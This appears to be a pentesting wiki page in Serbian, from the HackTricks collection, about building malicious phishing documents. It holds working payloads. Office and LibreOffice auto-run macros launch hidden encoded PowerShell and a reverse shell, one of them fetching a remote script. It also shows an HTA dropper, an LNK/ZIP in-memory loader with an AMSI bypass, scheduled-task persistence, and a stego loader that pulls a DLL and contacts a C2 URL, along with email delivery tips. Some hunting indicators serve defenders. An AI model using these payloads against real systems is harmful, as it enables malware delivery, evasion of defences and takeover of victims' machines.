# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Dokumenti

Microsoft Word vrši validaciju podataka datoteke pre njenog otvaranja. Validacija podataka se vrši u obliku identifikacije strukture podataka, prema standardu OfficeOpenXML. Ako dođe do greške tokom identifikacije strukture podataka, analizirana datoteka neće biti otvorena.

Obično Word datoteke koje sadrže macros koriste ekstenziju `.docm`. Međutim, moguće je preimenovati datoteku promenom ekstenzije i zadržati mogućnost izvršavanja macros.\
Na primer, RTF datoteka po dizajnu ne podržava macros, ali DOCM datoteka preimenovana u RTF biće obrađena u programu Microsoft Word i moći će da izvršava macros.\
Isti interni mehanizmi i procedure primenjuju se na sav softver iz Microsoft Office Suite (Excel, PowerPoint itd.).

Možete koristiti sledeću komandu da proverite koje ekstenzije će izvršavati neki Office programi:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX datoteke koje upućuju na udaljeni template (File –Options –Add-ins –Manage: Templates –Go) koji sadrži macros takođe mogu da „izvrše“ macros.

### Učitavanje spoljne slike

Idite na: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture i **Filename or URL**:_ http://<ip>/whatever

![Office Documents - Učitavanje spoljne slike: Idite na: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Backdoor makroa

Moguće je koristiti macros za pokretanje proizvoljnog koda iz dokumenta.

#### Funkcije za automatsko učitavanje

Što su češće, veća je verovatnoća da će ih AV detektovati.

- AutoOpen()
- Document_Open()

#### Primeri koda za macros
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Ručno uklonite metadata

Idite na **File > Info > Inspect Document > Inspect Document**, čime će se otvoriti Document Inspector. Kliknite na **Inspect**, a zatim na **Remove All** pored opcije **Document Properties and Personal Information**.

#### Doc Extension

Kada završite, izaberite padajući meni **Save as type** i promenite format sa **`.docx`** na **Word 97-2003 `.doc`**.\
Ovo uradite zato što **ne možete sačuvati macro-e unutar `.docx`** i zato što postoji **stigma** **oko** ekstenzije **`.docm`** koja podržava macro-e (npr. ikona thumbnail-a ima ogromno `!`, a neki web/email gateway-i ih u potpunosti blokiraju). Zbog toga je ova **legacy `.doc` ekstenzija najbolji kompromis**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

LibreOffice Writer dokumenti mogu sadržati Basic macros i automatski ih izvršiti kada se fajl otvori tako što se macro poveže sa događajem **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Jednostavan reverse shell macro izgleda ovako:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Obratite pažnju na udvojene navodnike (`""`) unutar stringa – LibreOffice Basic ih koristi za escape literalnih navodnika, tako da payload-i koji se završavaju sa `...==""")` zadržavaju balansirane i unutrašnju komandu i Shell argument.

Saveti za isporuku:

- Sačuvajte kao `.odt` i povežite macro sa događajem dokumenta kako bi se odmah pokrenuo pri otvaranju.
- Kada šaljete email pomoću `swaks`, koristite `--attach @resume.odt` (`@` je obavezan kako bi se kao prilog poslali bajtovi datoteke, a ne string sa nazivom datoteke). Ovo je ključno pri zloupotrebi SMTP servera koji prihvataju proizvoljne `RCPT TO` primaoce bez validacije.

## HTA datoteke

HTA je Windows program koji **kombinuje HTML i scripting jezike (kao što su VBScript i JScript)**. Generiše korisnički interfejs i izvršava se kao aplikacija sa „potpunim poverenjem“, bez ograničenja bezbednosnog modela browsera.

HTA se izvršava pomoću **`mshta.exe`**, koji je obično **instaliran** zajedno sa **Internet Explorer-om**, zbog čega `mshta` zavisi od IE-a. Ako je stoga deinstaliran, HTA datoteke neće moći da se izvrše.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forcing NTLM Authentication

Postoji nekoliko načina da se **daljinski "forsira NTLM authentication"**, na primer, možete dodati **nevidljive slike** u emailove ili HTML kojem će korisnik pristupiti (čak i HTTP MitM?). Ili žrtvi poslati **adresu datoteka** koje će **pokrenuti** **authentication** samo **otvaranjem foldera.**

**Pogledajte ove i druge ideje na sledećim stranicama:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Ne zaboravite da možete ne samo ukrasti hash ili authentication, već i **izvršiti NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Veoma efikasne kampanje dostavljaju ZIP koji sadrži dva legitimna dokumenta za odvraćanje pažnje (PDF/DOCX) i zlonamerni .lnk. Trik je u tome što se stvarni PowerShell loader čuva u raw bytes ZIP-a nakon jedinstvenog markera, a .lnk ga izdvaja i pokreće u potpunosti u memoriji.<sup>[[2]](#references)</sup>

Tipičan tok koji implementira .lnk PowerShell one-liner:

1) Pronaći originalni ZIP na uobičajenim putanjama: Desktop, Downloads, Documents, %TEMP%, %ProgramData% i parent direktorijumu trenutnog radnog direktorijuma.
2) Pročitati ZIP bytes i pronaći hardkodovani marker (npr. xFIQCV). Sve nakon markera predstavlja ugrađeni PowerShell payload.
3) Kopirati ZIP u %ProgramData%, tamo ga raspakovati i otvoriti decoy .docx kako bi delovao legitimno.
4) Bypass AMSI za trenutni process: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuscate sledeću fazu (npr. ukloniti sve # karaktere) i izvršiti je u memoriji.

Primer PowerShell skeleton-a za izdvajanje i pokretanje ugrađene faze:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Napomene
- Isporuka često zloupotrebljava ugledne PaaS poddomene (npr. *.herokuapp.com) i može da ograniči payload-e (isporučuje bezopasne ZIP datoteke na osnovu IP/UA podataka).
- Sledeća faza često dešifruje base64/XOR shellcode i izvršava ga putem Reflection.Emit + VirtualAlloc kako bi se smanjili artefakti na disku.

Persistence korišćen u istom lancu
- COM TypeLib hijacking Microsoft Web Browser kontrole, tako da IE/Explorer ili bilo koja aplikacija koja je ugrađuje automatski ponovo pokreće payload.<sup>[[2]](#references)[[4]](#references)</sup> Detalje i komande spremne za upotrebu pogledajte ovde:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Lov/IOC-ovi
- ZIP datoteke koje sadrže ASCII marker string (npr. xFIQCV) dodat na podatke arhive.
- .lnk koji nabraja nadređene/korisničke fascikle kako bi pronašao ZIP i otvorio dokument-mamac.
- AMSI tampering putem [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Dugotrajne poslovne prepiske koje se završavaju linkovima hostovanim na pouzdanim PaaS domenima.

## LNK staging sa mamcem na prvom mestu → scheduled-task persistence → trusted CPL side-loading

Drugi obrazac koji se često ponavlja jeste **`.lnk` koji imitira dokument** i odmah otvara bezopasan mamac, dok u pozadini priprema stvarni lanac.<sup>[[3]](#references)</sup>

Uočeni tok:
1. Prečica **se predstavlja kao PDF** i koristi `conhost.exe` ili sličan proxy za pokretanje obfuskovanog PowerShell downloader-a.
2. PowerShell fragmentiše očigledne tokene (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), tako da naivne detekcije koje traže `iwr`, `gci`, `ren`, `cpi` ili `schtasks` ne prepoznaju komandu.
3. Stager prvo preuzima **dokument-mamac**, otvara ga žrtvi, a zatim u pozadini rekonstruiše zlonamerne datoteke.
4. Payload-i mogu biti upisani sa **lažnim ekstenzijama**, a zatim preimenovani uklanjanjem dopunskih znakova, čime se odlaže pojava očiglednih `.exe` / `.cpl` artefakata.
5. Persistence se uspostavlja pomoću **scheduled task-a zasnovanog na minutnom intervalu**, koji pokreće trusted host binary iz putanje u koju korisnik može da upisuje.

Minimalni tragovi za lov na osnovu ovog obrasca:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Korisni raspored za staging koji treba prepoznati:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` ili `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Zašto je druga faza prikrivena

U Rapid7 studiji slučaja, scheduled task je iznova pokretao **`Fondue.exe`** iz direktorijuma `C:\Users\Public\`. Pošto je **`APPWIZ.cpl`** bio postavljen pored njega i eksportovao **`RunFODW`**, pouzdani Microsoft binarijum je side-loadovao napadačev CPL umesto legitimne sistemske kopije.

CPL zatim:
- Čita **AES-256-CBC** blob iz `C:\Windows\Tasks\editor.dat`
- Dešifruje ga pomoću **Windows CNG / `bcrypt.dll`**
- Alocira izvršivu memoriju i kopira dešifrovani shellcode
- Indirektno ga izvršava prosleđivanjem pokazivača na shellcode kao callback za **`EnumUILanguagesW`**

Ovaj poslednji korak vredi posebno tražiti: malware često izbegava direktan skok `((void(*)())buf)()` i umesto toga zloupotrebljava **legitimni WinAPI koji prihvata callback** za prenos izvršavanja.

Dešifrovani payload u ovoj kampanji bio je **Donut** shellcode, koji je zatim u potpunosti mapirao finalni PE u memoriju i izvršio patchovanje **AMSI/WLDP/ETW** u trenutnom procesu pre prosleđivanja izvršavanja. Za detaljnije beleške o side-loadingu i post-processing-u rezidentnom u memoriji pogledajte:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktični hunting pivot-i:
- `.lnk` koji pokreće `powershell.exe` ili `conhost.exe`, nakon čega sledi vidljiv decoy dokument.
- Kratkotrajna preuzimanja u **`C:\Users\Public\`**, praćena trenutnim preimenovanjima iz besmislenih ekstenzija.
- Scheduled tasks sa bezazlenim imenima, kao što je `GoogleErrorReport`, koji se izvršavaju iz **direktorijuma u koje korisnik može da upisuje**.
- Pouzdani binarijumi koji učitavaju **`.cpl` / `.dll`** datoteke iz istog direktorijuma koji nije sistemski.
- Base64 tekstualni blob-ovi zapisani u **`C:\Windows\Tasks\`**, koje zatim čita side-loadovani modul.

## Payload-i razgraničeni steganografijom u slikama (PowerShell stager)

Noviji loader lanci isporučuju obfuscirani JavaScript/VBS koji dekodira i pokreće Base64 PowerShell stager. Taj stager preuzima sliku (često GIF) koja sadrži Base64-enkodovani .NET DLL skriven kao običan tekst između jedinstvenih početnih/završnih markera. Skripta traži ove delimitere (primeri viđeni u praksi: «<<sudo_png>> … <<sudo_odt>>>»), izdvaja tekst između njih, Base64-dekodira ga u bajtove, učitava assembly u memoriju i poziva poznati entry method sa C2 URL-om.<sup>[[5]](#references)</sup>

Tok rada
- Faza 1: Arhivirani JS/VBS dropper → dekodira ugrađeni Base64 → pokreće PowerShell stager sa -nop -w hidden -ep bypass.
- Faza 2: PowerShell stager → preuzima sliku, izdvaja Base64 razgraničen markerima, učitava .NET DLL u memoriju i poziva njegov method (npr. VAI), prosleđujući C2 URL i opcije.
- Faza 3: Loader preuzima finalni payload i obično ga injektuje pomoću process hollowing-a u pouzdani binarijum (najčešće MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Više o process hollowing-u i proxy izvršavanju preko pouzdanih utility-ja pogledajte ovde:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell primer za izdvajanje DLL-a iz slike i pozivanje .NET method-a u memoriji:

<details>
<summary>PowerShell stego payload extractor i loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Napomene
- Ovo je ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Markeri se razlikuju među kampanjama.
- AMSI/ETW bypass i string deobfuscation se obično primenjuju pre učitavanja assembly-ja.
- Hunting: skenirati preuzete slike u potrazi za poznatim delimiterima; identifikovati PowerShell koji pristupa slikama i odmah dekodira Base64 blobove.

Pogledajte i stego alate i carving tehnike:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Česta inicijalna faza je mali, veoma obfuskovan `.js` ili `.vbs` dostavljen unutar arhive. Njegova jedina svrha jeste da dekodira ugrađeni Base64 string i pokrene PowerShell sa `-nop -w hidden -ep bypass`, kako bi bootstrap-ovao sledeću fazu preko HTTPS-a.<sup>[[5]](#references)</sup>

Skeleton logika (apstraktno):
- Pročitati sadržaj sopstvenog fajla
- Locirati Base64 blob između junk stringova
- Dekodirati u ASCII PowerShell
- Izvršiti pomoću `wscript.exe`/`cscript.exe`, pozivanjem `powershell.exe`

Hunting indikatori
- Arhivirani JS/VBS attachmenti koji pokreću `powershell.exe` sa `-enc`/`FromBase64String` u komandnoj liniji.
- `wscript.exe` koji pokreće `powershell.exe -nop -w hidden` iz korisničkih temp putanja.

## Windows fajlovi za krađu NTLM hash-eva

Pogledajte stranicu o **mestima za krađu NTLM kredencijala**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine kampanja: sofisticirani phishing napad usmeren na američke kompanije](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: praćenje tradecraft-a Dropping Elephant kroz loader lanac sa tematikom Kine](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Nova COM persistence tehnika (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader isporučuje niz infostealer-a](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
{{#include ../../banners/hacktricks-training.md}}
